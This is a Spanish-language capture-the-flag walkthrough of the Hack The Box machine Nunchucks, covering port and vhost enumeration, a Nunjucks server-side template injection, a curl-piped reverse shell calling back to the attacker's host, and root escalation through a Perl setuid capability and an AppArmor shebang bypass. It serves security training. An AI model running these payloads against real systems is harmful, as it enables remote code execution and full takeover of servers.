---
icon: desktop
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Nunchucks

`Nunchucks` es una máquina sencilla que explora una inyección de plantilla del lado del servidor (SSTI) basada en NodeJS que conduce a un error de AppArmor que ignora el perfil de AppArmor del binario mientras ejecuta scripts que incluyen el contenido de la aplicación perfilada.

<figure><img src="../../.gitbook/assets/Nunchucks.png" alt="" width="563"><figcaption></figcaption></figure>

***



```bash
❯ nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.11.122 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-16 22:29 CET
Initiating SYN Stealth Scan at 22:29
Scanning 10.10.11.122 [65535 ports]
Discovered open port 22/tcp on 10.10.11.122
Discovered open port 80/tcp on 10.10.11.122
Discovered open port 443/tcp on 10.10.11.122
Completed SYN Stealth Scan at 22:29, 12.55s elapsed (65535 total ports)
Nmap scan report for 10.10.11.122
Host is up, received user-set (0.051s latency).
Scanned at 2025-02-16 22:29:35 CET for 13s
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 63
80/tcp  open  http    syn-ack ttl 63
443/tcp open  https   syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 12.67 seconds
           Raw packets sent: 65535 (2.884MB) | Rcvd: 65542 (2.622MB)
```



```bash
❯ extractPorts allPorts

[*] Extracting information...

	[*] IP Address: 10.10.11.122
	[*] Open ports: 22,80,443

[*] Ports copied to clipboard
```



```bash
❯ nmap -sCV -p22,80,443 10.10.11.122 -A -oN targeted -oX targetedXML
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-16 22:31 CET
Nmap scan report for nunchucks.htb (10.10.11.122)
Host is up (0.065s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 6c:14:6d:bb:74:59:c3:78:2e:48:f5:11:d8:5b:47:21 (RSA)
|   256 a2:f4:2c:42:74:65:a3:7c:26:dd:49:72:23:82:72:71 (ECDSA)
|_  256 e1:8d:44:e7:21:6d:7c:13:2f:ea:3b:83:58:aa:02:b3 (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://nunchucks.htb/
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
|_http-title: Nunchucks - Landing Page
| tls-alpn: 
|_  http/1.1
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg: 
|_  http/1.1
| ssl-cert: Subject: commonName=nunchucks.htb/organizationName=Nunchucks-Certificates/stateOrProvinceName=Dorset/countryName=UK
| Subject Alternative Name: DNS:localhost, DNS:nunchucks.htb
| Not valid before: 2021-08-30T15:42:24
|_Not valid after:  2031-08-28T15:42:24
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   104.88 ms 10.10.16.1
2   30.95 ms  nunchucks.htb (10.10.11.122)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.45 seconds

```



```bash
❯ xsltproc targetedXML > index.html
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```



<figure><img src="../../.gitbook/assets/imagen (396).png" alt=""><figcaption></figcaption></figure>



```bash
❯ cat /etc/hosts | grep nunchucks
10.10.11.122 nunchucks.htb 
```



```bash
❯ whatweb https://nunchucks.htb
https://nunchucks.htb [200 OK] Bootstrap, Cookies[_csrf], Country[RESERVED][ZZ], Email[support@nunchucks.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.122], JQuery, Script, Title[Nunchucks - Landing Page], X-Powered-By[Express], nginx[1.18.0]
```



<figure><img src="../../.gitbook/assets/imagen (397).png" alt=""><figcaption></figcaption></figure>



```bash
❯ feroxbuster -u https://nunchucks.htb/ -t 200 -C 500,502,404 -k
                                                                                                               
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://nunchucks.htb/
 🚀  Threads               │ 200
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 💢  Status Code Filters   │ [500, 502, 404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET        3l        6w       45c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET       10l       16w      179c https://nunchucks.htb/assets => https://nunchucks.htb/assets/
200      GET      183l      662w     9172c https://nunchucks.htb/Login
200      GET      250l     1863w    19134c https://nunchucks.htb/privacy
200      GET      245l     1737w    17753c https://nunchucks.htb/terms
200      GET      187l      683w     9488c https://nunchucks.htb/signup
200      GET       12l       78w     4155c https://nunchucks.htb/assets/images/customer-logo-1.png
200      GET      125l      669w    53396c https://nunchucks.htb/assets/images/introduction.jpg
```





<figure><img src="../../.gitbook/assets/5035_vmware_bbTV7ousqb.png" alt=""><figcaption></figcaption></figure>





```bash
❯ wfuzz --hh=30587 -c --hc=404,400 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -H "Host: FUZZ.nunchucks.htb" https://nunchucks.htb 2>/dev/null
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://nunchucks.htb/
Total requests: 220547

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                              
=====================================================================

000000194:   200        101 L    259 W      4028 Ch     "store" 
```



```bash
❯ cat /etc/hosts | grep nunchucks
10.10.11.122 nunchucks.htb store.nunchucks.htbbas
```



```bash
❯ whatweb https://store.nunchucks.htb/
https://store.nunchucks.htb/ [200 OK] Bootstrap, Cookies[_csrf], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.122], JQuery[1.10.2], Script[text/javascript], Title[Nunchucks Homepage], X-Powered-By[Express], X-UA-Compatible[IE=edge], nginx[1.18.0]
```



<figure><img src="../../.gitbook/assets/imagen (398).png" alt=""><figcaption></figcaption></figure>



```bash
❯ feroxbuster -u https://store.nunchucks.htb/ -t 200 -C 500,502,404 -k
                                                                                                                                                                                                                                      
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://store.nunchucks.htb/
 🚀  Threads               │ 200
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 💢  Status Code Filters   │ [500, 502, 404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET        3l        6w       45c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET       10l       16w      179c https://store.nunchucks.htb/assets => https://store.nunchucks.htb/assets/
200      GET        7l       15w      245c https://store.nunchucks.htb/assets/css/fonts.css
200      GET       14l       30w      424c https://store.nunchucks.htb/assets/js/main.js
200      GET       20l       82w     6403c https://store.nunchucks.htb/assets/images/flags/GB.png
200      GET       16l       82w     6002c https://store.nunchucks.htb/assets/images/flags/US.png
200      GET     1566l     2676w    25180c https://store.nunchucks.htb/assets/css/font-awesome.css
```



<figure><img src="../../.gitbook/assets/imagen (399).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (402).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (400).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (401).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (403).png" alt=""><figcaption></figcaption></figure>



{% embed url="https://medium.com/@bdemir/a-pentesters-guide-to-server-side-template-injection-ssti-c5e3998eae68" %}

```bash
${{<%[%'"}}%\.
```

<figure><img src="../../.gitbook/assets/imagen (405).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/template-decision-tree.png" alt=""><figcaption></figcaption></figure>





<figure><img src="../../.gitbook/assets/imagen (404).png" alt=""><figcaption></figcaption></figure>



{% embed url="https://www.invicti.com/web-vulnerability-scanner/vulnerabilities/code-execution-via-ssti-nodejs-nunjucks/" %}



{% embed url="https://github.com/NightRang3r/misc_nuclei_templates/blob/main/node-nunjucks-ssti.yaml" %}

```javascript
{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')\")()}}
```

<figure><img src="../../.gitbook/assets/5044_vmware_TSQyzmqJb7.png" alt=""><figcaption></figcaption></figure>



```javascript
{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('which curl')\")()}}
```

<figure><img src="../../.gitbook/assets/imagen (406).png" alt=""><figcaption></figcaption></figure>



```bash
❯ cat shell.sh
#!/bin/bash

/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.3/443 0>&1'

❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```



```bash
❯ nc -nlvp 443
listening on [any] 443 ...
```





```javascript
{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('curl http://10.10.16.3/shell.sh|bash')\")()}}
```

<figure><img src="../../.gitbook/assets/5046_vmware_fAYNzc0l0w.png" alt=""><figcaption></figcaption></figure>



```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.11.122] 37010
bash: cannot set terminal process group (993): Inappropriate ioctl for device
bash: no job control in this shell
david@nunchucks:/var/www/store.nunchucks$ cat /home/david/user.txt
d967f92377f2308aba4bbb3869c72b4a
```



```bash
david@nunchucks:/var/www/store.nunchucks$ script /dev/null -c bash
Script started, file is /dev/null
david@nunchucks:/var/www/store.nunchucks$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo;fg
[1]  + continued  nc -nlvp 443
                              reset xterm
david@nunchucks:/var/www/store.nunchucks$ export TERM=xterm
david@nunchucks:/var/www/store.nunchucks$ export SHELL=bash
david@nunchucks:/var/www/store.nunchucks$ stty rows 46 columns 230
```



```
david@nunchucks:/var/www/store.nunchucks$ id
uid=1000(david) gid=1000(david) groups=1000(david)
david@nunchucks:/var/www/store.nunchucks$ sudo -l
[sudo] password for david: 
```



```bash
david@nunchucks:/var/www/store.nunchucks$ find / -perm -4000 2>/dev/null
/usr/bin/fusermount
/usr/bin/umount
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/at
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/su
/usr/bin/sudo
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/sbin/pppd

david@nunchucks:/var/www/store.nunchucks$ getcap -r / 2>/dev/null
/usr/bin/perl = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```



```bash
❯ searchbins -b perl -f capabilities

[+] Binary: perl

================================================================================
[*] Function: capabilities -> [https://gtfobins.github.io/gtfobins/perl/#capabilities]

	| ./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```



```bash
david@nunchucks:/var/www/store.nunchucks$ which perl
/usr/bin/perl
david@nunchucks:/var/www/store.nunchucks$ cd /usr/bin/
david@nunchucks:/usr/bin$ ./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
david@nunchucks:/usr/bin$ ./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "id";'
uid=0(root) gid=1000(david) groups=1000(david)
david@nunchucks:/usr/bin$ ./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "whoami";'
root
```



<figure><img src="../../.gitbook/assets/imagen (407).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (408).png" alt=""><figcaption></figcaption></figure>





{% hint style="info" %}
AppArmor es un módulo de seguridad del kernel de Linux que puedes utilizar para restringir las capacidades de los procesos que se ejecutan en el sistema operativo host. Cada proceso puede tener su propio perfil de seguridad.
{% endhint %}

{% embed url="https://computernewage.com/2022/09/03/gnu-linux-apparmor-tutorial/" %}



```bash
david@nunchucks:/etc/apparmor.d$ ls -l
total 56
drwxr-xr-x 4 root root 4096 Oct 28  2021 abstractions
drwxr-xr-x 2 root root 4096 Oct 28  2021 disable
drwxr-xr-x 2 root root 4096 Oct 28  2021 force-complain
drwxr-xr-x 2 root root 4096 Oct 28  2021 local
-rw-r--r-- 1 root root 1313 May 19  2020 lsb_release
-rw-r--r-- 1 root root 1108 May 19  2020 nvidia_modprobe
-rw-r--r-- 1 root root 3222 Mar 11  2020 sbin.dhclient
drwxr-xr-x 5 root root 4096 Oct 28  2021 tunables
-rw-r--r-- 1 root root 3202 Feb 25  2020 usr.bin.man
-rw-r--r-- 1 root root  442 Sep 26  2021 usr.bin.perl
-rw-r--r-- 1 root root  672 Feb 19  2020 usr.sbin.ippusbxd
-rw-r--r-- 1 root root 2006 Jul 22  2021 usr.sbin.mysqld
-rw-r--r-- 1 root root 1575 Feb 11  2020 usr.sbin.rsyslogd
-rw-r--r-- 1 root root 1385 Dec  7  2019 usr.sbin.tcpdump
```



```bash
david@nunchucks:/etc/apparmor.d$ cat usr.bin.perl
# Last Modified: Tue Aug 31 18:25:30 2021
#include <tunables/global>

/usr/bin/perl {
  #include <abstractions/base>
  #include <abstractions/nameservice>
  #include <abstractions/perl>

  capability setuid,

  deny owner /etc/nsswitch.conf r,
  deny /root/* rwx,
  deny /etc/shadow rwx,

  /usr/bin/id mrix,
  /usr/bin/ls mrix,
  /usr/bin/cat mrix,
  /usr/bin/whoami mrix,
  /opt/backup.pl mrix,
  owner /home/ r,
  owner /home/david/ r,

}
```





{% embed url="https://0xma.github.io/hacking/bypass_apparmor_with_perl_script.html" %}

```bash
david@nunchucks:/tmp$ cat gzzcoo.pl
#!/usr/bin/perl

use POSIX qw(strftime);
use POSIX qw(setuid);
POSIX;;setuid(0);

exec "/bin/bash";
david@nunchucks:/tmp$ chmod +x gzzcoo.pl 
david@nunchucks:/tmp$ perl gzzcoo.pl 
Can't open perl script "gzzcoo.pl": Permission denied
david@nunchucks:/tmp$ ./gzzcoo.pl 
root@nunchucks:/tmp# whoami
root
root@nunchucks:/tmp# cat /root/root.txt 
d67dd7dd3350fdd2847d623f6e5e8333
```
